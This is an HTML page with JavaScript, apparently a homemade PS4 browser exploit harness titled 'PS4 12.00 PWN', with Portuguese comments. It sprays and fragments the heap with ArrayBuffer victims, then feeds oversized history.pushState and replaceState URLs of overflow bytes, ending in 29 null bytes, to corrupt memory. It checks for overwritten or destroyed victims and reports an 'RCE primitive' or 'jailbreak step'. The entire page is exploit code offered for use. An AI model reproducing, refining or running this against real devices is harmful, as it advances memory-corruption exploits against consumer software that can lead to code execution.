<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PWN (Object Nuke Detector)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
        .win { color: #ff0; font-weight: bold; border: 1px solid #ff0; padding: 5px; background: #440; }
    </style>
</head>
<body>

<h1>REPLICA 100% + DETECTOR DE NUKE</h1>
<p>Sequência: 6 -> 3 -> 1 (Cancelar no OOM)</p>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Gatilho + Detector)</h3>
<p style="color:red">CLIQUE EM CANCELAR NA MENSAGEM DE MEMÓRIA.</p>
<button onclick="test1_FullRunAndInject()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let heapObjects = [];
let targetObjects = [];

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? 'yellow' : '#0f0';
    el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    targetObjects = [];
    
    // Spray genérico
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    // Buracos
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    // Alvos (Vítimas)
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            view: view
        });
    }
    log('Heap preparado.');
}

// === A MUDANÇA ESTÁ AQUI: CHECAGEM INTELIGENTE ===
function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(50, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            
            // Tenta acessar a propriedade.
            // Se o objeto foi destruído pelos zeros, isso vai gerar o erro que você viu.
            let len = t.view.length;
            let val = t.view[0];

            if (len !== 256 || val !== 0xDEADBEEF) {
                log(`!!! JACKPOT !!! Alvo ${i} MODIFICADO! (Len: ${len})`, 'win');
                corrupted++;
                document.body.style.backgroundColor = "#004400";
                alert("RCE PRIMITIVE: Length Corruption!");
                return true;
            }
        } catch (e) {
            // CAPTURANDO O SUCESSO DISFARÇADO DE ERRO
            if (e.message.includes("undefined is not an object") || e.message.includes("null")) {
                log(`!!! JACKPOT !!! Alvo ${i} DESTRUÍDO (OBJECT NUKE)!`, 'win');
                log(`    Causa: Header sobrescrito por Zeros. O pointer se perdeu.`, 'win');
                log(`    Isso confirma que temos ESCRITA DE MEMÓRIA no lugar certo!`, 'win');
                
                document.body.style.backgroundColor = "#004400";
                alert("JAILBREAK STEP 1: POINTER OVERWRITE CONFIRMED!");
                corrupted++;
                return true;
            } else {
                log(`Alvo ${i} erro desconhecido: ${e.message}`);
            }
        }
    }
    return false;
}

// ===================================================================
// TESTE 6: CÓPIA EXATA
// ===================================================================
async function test6_Incremental() {
    log('=== TESTE 6: INCREMENTAL ===');
    prepareHeap();
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    
    for (let i = 0; i < 10; i++) {
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) overflow += String.fromCharCode(j % 33);
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            log(`SUCESSO com ${currentSize} bytes`);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500)); 
        } catch (e) {
            log(`CRASH em ${currentSize} bytes: ${e.message}`);
            break;
        }
    }
    log("Teste 6 Finalizado.");
}

// ===================================================================
// TESTE 3: CÓPIA EXATA
// ===================================================================
async function test3_SpecialSequences() {
    log('=== TESTE 3: SEQUÊNCIAS ===');
    prepareHeap(); 
    const sequences = [
        { name: "Nulls", bytes: "\x00\x00\x00\x00" },
        { name: "Newlines", bytes: "\x0A\x0A\x0A\x0A" },
        { name: "Tabs", bytes: "\x09\x09\x09\x09" },
        { name: "CR", bytes: "\x0D\x0D\x0D\x0D" },
        { name: "Space", bytes: "\x20\x20\x20\x20" },
        { name: "Mixed", bytes: "\x00\x09\x0A\x0D\x20" }
    ];

    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq.bytes) overflow += String.fromCharCode(byte);
            }
            history.pushState({}, seq.name.replace(/\s/g, '_'), "/" + base + overflow);
            log(`SUCESSO: ${seq.name}`);
            await new Promise(r => setTimeout(r, 100)); 
        } catch (e) {
            log(`CRASH: ${seq.name} - ${e.message}`);
        }
    }
    log("Teste 3 Finalizado.");
}

// ===================================================================
// TESTE 1: LOOP + INJEÇÃO + VÍTIMAS EXTRAS
// ===================================================================
async function test1_FullRunAndInject() {
    log('=== TESTE 1: STRESS LOOP (GATILHO) ===');
    
    // Adiciona mais vítimas frescas no topo antes de estressar
    log("Adicionando vítimas finais...");
    for(let k=0; k<50; k++) {
        let v = new Uint32Array(256);
        v.fill(0xDEADBEEF);
        targetObjects.unshift(v); 
    }

    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100); 
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            if (byte % 32 === 0) {
                 log(`Testando 0x${byte.toString(16)}...`);
                 await new Promise(r => setTimeout(r, 10)); 
            }
        } catch (e) {
            log(`OOM em 0x${byte.toString(16)} (Mantenha o loop rodando...)`);
        }
    }
    
    log("LOOP FINALIZADO. INJETANDO 29 BYTES...");
    
    try {
        const base = "A".repeat(BASE_SAFE);
        const attack = "\x00".repeat(29); 
        
        history.replaceState({}, "PWN_FINAL", "/" + base + attack);
        
        log(">>> INJEÇÃO FEITA. VERIFICANDO NUKE... <<<", 'win');
        checkCorruption();
        
    } catch(ex) {
        log("Falha na injeção final: " + ex.message);
    }
}
</script>
</body>
</html>
